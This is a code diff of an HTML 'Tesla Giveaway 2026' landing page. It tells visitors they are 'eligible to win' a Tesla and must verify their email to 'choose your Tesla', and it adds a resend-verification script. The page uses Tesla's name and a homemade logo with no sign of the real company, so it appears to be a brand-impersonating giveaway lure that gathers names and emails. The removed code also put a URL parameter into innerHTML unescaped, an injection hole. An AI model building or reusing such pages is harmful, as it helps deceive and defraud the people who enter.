@@ -3,123 +3,138 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#000000">
-  <title>Congratulations! | Tesla Giveaway</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>tailwind.config={theme:{extend:{colors:{tesla:{red:'#E82127',dark:'#000000'}},animation:{'fade-in':'fadeIn 0.8s ease-out','slide-up':'slideUp 0.6s ease-out','pulse-red':'pulseRed 2s ease-in-out infinite','success-pop':'successPop 0.5s cubic-bezier(0.68,-0.55,0.265,1.55)','float':'float 5s ease-in-out infinite'},keyframes:{fadeIn:{'0%':{opacity:0,transform:'translateY(20px)'},'100%':{opacity:1,transform:'translateY(0)'}},slideUp:{'0%':{opacity:0,transform:'translateY(40px)'},'100%':{opacity:1,transform:'translateY(0)'}},pulseRed:{'0%,100%':{opacity:1},'50%':{opacity:0.6}},successPop:{'0%':{transform:'scale(0)',opacity:0},'50%':{transform:'scale(1.2)'},'100%':{transform:'scale(1)',opacity:1}},float:{'0%,100%':{transform:'translateY(0)'},'50%':{transform:'translateY(-15px)'}}}}}}</script>
+  <title>You're Eligible! | Tesla Giveaway 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
   <style>
-    .confetti{position:fixed;width:10px;height:10px;animation:confettiFall 3s ease-out forwards;pointer-events:none;z-index:9999}
-    @keyframes confettiFall{0%{transform:translateY(-100vh) rotate(0deg);opacity:1}100%{transform:translateY(100vh) rotate(720deg);opacity:0}}
-    .email-icon{animation:successPop .5s cubic-bezier(0.68,-0.55,0.265,1.55)}
-    @keyframes envelopeFly{0%{transform:translateX(-100px);opacity:0}60%{transform:translateX(10px);opacity:1}80%{transform:translateX(-5px)}100%{transform:translateX(0);opacity:1}}
-    .envelope-anim{animation:envelopeFly .8s ease-out}
+    body{background:var(--light);}
+    .page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
+    .congrats-card{background:white;border-radius:28px;box-shadow:0 24px 64px rgba(0,0,0,.1);border:1.5px solid rgba(0,0,0,.05);padding:56px 48px;max-width:540px;width:100%;text-align:center;animation:fadeInUp .7s ease forwards;}
+    @media(max-width:560px){.congrats-card{padding:36px 22px;border-radius:20px;}}
+
+    .email-icon{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,var(--red),#ff3c57);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 10px 32px rgba(227,25,55,.35);animation:successPop .6s cubic-bezier(.34,1.56,.64,1);}
+
+    .congrats-title{font-size:30px;font-weight:900;color:var(--dark);margin-bottom:12px;line-height:1.2;}
+    .congrats-sub{font-size:15px;color:var(--gray-2);line-height:1.7;margin-bottom:32px;}
+    .email-display{background:rgba(227,25,55,.05);border:1px solid rgba(227,25,55,.15);border-radius:12px;padding:14px 20px;font-size:14px;color:var(--dark);font-weight:600;margin-bottom:28px;word-break:break-all;}
+    .email-display .email-label{color:var(--gray-2);font-weight:400;font-size:13px;margin-bottom:4px;}
+
+    .steps-preview{background:var(--light);border-radius:16px;padding:22px 24px;text-align:left;margin-bottom:28px;}
+    .preview-title{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:14px;}
+    .preview-step{display:flex;align-items:center;gap:12px;padding:8px 0;}
+    .preview-step:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
+    .preview-step-num{width:26px;height:26px;border-radius:50%;background:var(--red);color:white;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .preview-step-text{font-size:14px;color:var(--dark);font-weight:500;}
+
+    .resend-area{margin-top:4px;}
+    .resend-note{font-size:13px;color:var(--gray-2);margin-bottom:14px;}
+    #resendBtn{background:transparent;border:1.5px solid var(--border);color:var(--gray);font-size:14px;font-weight:600;padding:11px 24px;border-radius:var(--radius);cursor:pointer;transition:all var(--transition);}
+    #resendBtn:hover{border-color:var(--red);color:var(--red);}
+    #resendBtn:disabled{opacity:.5;cursor:not-allowed;}
+    .resend-countdown{font-size:12px;color:var(--gray-2);margin-top:8px;display:none;}
+
+    /* Email illustration */
+    .envelope-anim{position:relative;display:inline-block;}
+    .envelope-anim svg{animation:bounce 2.5s ease-in-out infinite;animation-delay:.8s;}
   </style>
 </head>
-<body class="min-h-screen flex flex-col bg-black">
+<body>
 
-<nav class="w-full z-50 bg-black/95 backdrop-blur-md border-b border-gray-900">
-  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-    <div class="flex items-center justify-between h-16">
-      <a href="/" class="flex items-center gap-2">
-        <svg width="28" height="28" viewBox="0 0 100 100"><path d="M50 5 L85 25 L85 75 L50 95 L15 75 L15 25 Z" fill="none" stroke="#E82127" stroke-width="4"/><text x="50" y="64" text-anchor="middle" fill="#E82127" font-size="28" font-weight="bold">T</text></svg>
-        <span class="text-lg font-bold tracking-[0.15em] text-red-500">TESLA</span>
-      </a>
-    </div>
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
   </div>
 </nav>
 
-<main class="flex-1 flex items-center justify-center px-4 py-12 relative">
-  <!-- Confetti container -->
-  <div id="confettiContainer" class="fixed inset-0 pointer-events-none z-50"></div>
+<div class="page">
+  <div class="congrats-card">
+    <div class="email-icon envelope-anim">
+      <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="4" width="20" height="16" rx="2"/>
+        <path d="M2 7l10 7 10-7"/>
+      </svg>
+    </div>
 
-  <div class="w-full max-w-lg text-center">
-    <!-- Success Icon -->
-    <div class="mb-8 animate-fade-in">
-      <div class="inline-flex items-center justify-center w-24 h-24 rounded-full bg-gradient-to-br from-green-500/20 to-green-600/20 border border-green-500/30 email-icon relative">
-        <svg class="w-12 h-12 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
-        </svg>
-        <!-- Checkmark -->
-        <div class="absolute -bottom-1 -right-1 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-lg">
-          <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
-        </div>
+    <h1 class="congrats-title">You're Eligible to Win! 🎉</h1>
+    <p class="congrats-sub">
+      Congratulations, <strong id="userName">there</strong>! Your entry has been received. To confirm your place in the draw and unlock your winner dashboard, you need to verify your email address.
+    </p>
+
+    <div class="email-display">
+      <div class="email-label">Verification email sent to</div>
+      <div id="emailShown">your email address</div>
+    </div>
+
+    <div class="steps-preview">
+      <div class="preview-title">What happens next</div>
+      <div class="preview-step">
+        <div class="preview-step-num">1</div>
+        <div class="preview-step-text">Open the email from <strong>Tesla Giveaway</strong> in your inbox</div>
+      </div>
+      <div class="preview-step">
+        <div class="preview-step-num">2</div>
+        <div class="preview-step-text">Click the <strong>"Verify My Email"</strong> button in the email</div>
+      </div>
+      <div class="preview-step">
+        <div class="preview-step-num">3</div>
+        <div class="preview-step-text">You'll be taken to your dashboard to <strong>choose your Tesla</strong></div>
       </div>
     </div>
 
-    <!-- Heading -->
-    <h1 class="text-3xl sm:text-4xl md:text-5xl font-bold mb-4 animate-slide-up">
-      <span class="gradient-text">Congratulations!</span>
-    </h1>
-
-    <p class="text-xl sm:text-2xl text-white font-semibold mb-6 animate-fade-in" style="animation-delay:0.3s" id="greetingText">
-      You are eligible to win a brand new Tesla!
-    </p>
-
-    <!-- Email Verification Card -->
-    <div class="glass rounded-2xl p-6 sm:p-8 mb-8 animate-fade-in envelope-anim" style="animation-delay:0.5s">
-      <div class="text-4xl mb-4">📧</div>
-      <h2 class="text-lg font-semibold mb-3">Check Your Email</h2>
-      <p class="text-gray-400 text-sm leading-relaxed mb-4">
-        We've sent a verification email to <strong class="text-white" id="userEmail">your email</strong>. 
-        Please click the verification link in that email to confirm your entry and access your dashboard.
-      </p>
-      <div class="flex items-center justify-center gap-2 text-xs text-gray-500">
-        <span class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse-red"></span>
-        Awaiting email verification
-      </div>
+    <div class="resend-area">
+      <p class="resend-note">Didn't receive the email? Check your spam folder or request a new one.</p>
+      <button id="resendBtn" onclick="resendEmail()">Resend Verification Email</button>
+      <div class="resend-countdown" id="resendCountdown"></div>
     </div>
-
-    <!-- Instructions -->
-    <div class="glass rounded-xl p-5 text-left animate-fade-in" style="animation-delay:0.7s">
-      <h3 class="text-sm font-semibold mb-3 text-gray-300">📋 Next Steps:</h3>
-      <ol class="space-y-2 text-sm text-gray-400">
-        <li class="flex gap-2"><span class="text-red-500 font-bold">1.</span> Open your email inbox</li>
-        <li class="flex gap-2"><span class="text-red-500 font-bold">2.</span> Find the email from <strong class="text-white">Tesla Giveaway</strong></li>
-        <li class="flex gap-2"><span class="text-red-500 font-bold">3.</span> Click <strong class="text-white">"Verify My Email"</strong></li>
-        <li class="flex gap-2"><span class="text-red-500 font-bold">4.</span> You'll be redirected to pick your Tesla!</li>
-      </ol>
-    </div>
-
-    <!-- Didn't receive -->
-    <p class="text-gray-600 text-xs mt-6 animate-fade-in" style="animation-delay:0.9s">
-      Didn't receive the email? Check your spam folder or 
-      <a href="/entry.html" class="text-red-500 hover:text-red-400 transition-colors">try again</a>.
-    </p>
   </div>
-</main>
+</div>
 
+<script src="/js/app.js"></script>
 <script>
 // Get params
-const email = decodeURIComponent(getParam('email') || 'your email');
-const firstName = decodeURIComponent(getParam('firstName') || 'there');
+const email = getParam('email') || '';
+const name = getParam('name') || 'there';
 
-document.getElementById('userEmail').textContent = email;
-document.getElementById('greetingText').innerHTML = `Congratulations${firstName !== 'there' ? ', ' + firstName : ''}!<br>You are eligible to win a brand new Tesla!`;
-
-// Launch confetti
-function launchConfetti() {
-  const container = document.getElementById('confettiContainer');
-  const colors = ['#E82127','#ff6b6b','#ff3333','#ff6666','#ffffff','#cccccc','#00cc44','#ffd700'];
-  
-  for (let i = 0; i < 80; i++) {
-    const particle = document.createElement('div');
-    particle.className = 'confetti';
-    particle.style.left = Math.random() * 100 + '%';
-    particle.style.top = -(Math.random() * 20) + 'px';
-    particle.style.width = (Math.random() * 8 + 6) + 'px';
-    particle.style.height = (Math.random() * 8 + 6) + 'px';
-    particle.style.background = colors[Math.floor(Math.random() * colors.length)];
-    particle.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-    particle.style.animationDuration = (Math.random() * 2 + 2) + 's';
-    particle.style.animationDelay = Math.random() * 0.5 + 's';
-    container.appendChild(particle);
-  }
-  
-  setTimeout(() => container.innerHTML = '', 4000);
+document.getElementById('userName').textContent = name;
+if (email) {
+  document.getElementById('emailShown').textContent = email;
 }
 
-launchConfetti();
+// Resend
+let resendCooldown = 0;
+let resendTimer = null;
+
+async function resendEmail() {
+  if (!email) { showToast('Email address not found. Please re-enter the giveaway.', 'error'); return; }
+
+  const btn = document.getElementById('resendBtn');
+  btn.disabled = true;
+
+  try {
+    await apiCall('/resend', 'POST', { email });
+    showToast('✅ Verification email resent! Check your inbox.', 'success');
+
+    // Start 60s cooldown
+    resendCooldown = 60;
+    const countdownEl = document.getElementById('resendCountdown');
+    countdownEl.style.display = 'block';
+    resendTimer = setInterval(() => {
+      resendCooldown--;
+      countdownEl.textContent = `You can resend again in ${resendCooldown}s`;
+      if (resendCooldown <= 0) {
+        clearInterval(resendTimer);
+        btn.disabled = false;
+        countdownEl.style.display = 'none';
+      }
+    }, 1000);
+  } catch (err) {
+    btn.disabled = false;
+    showToast(err.message || 'Could not resend email. Please try again.', 'error');
+  }
+}
 </script>
 </body>
 </html>
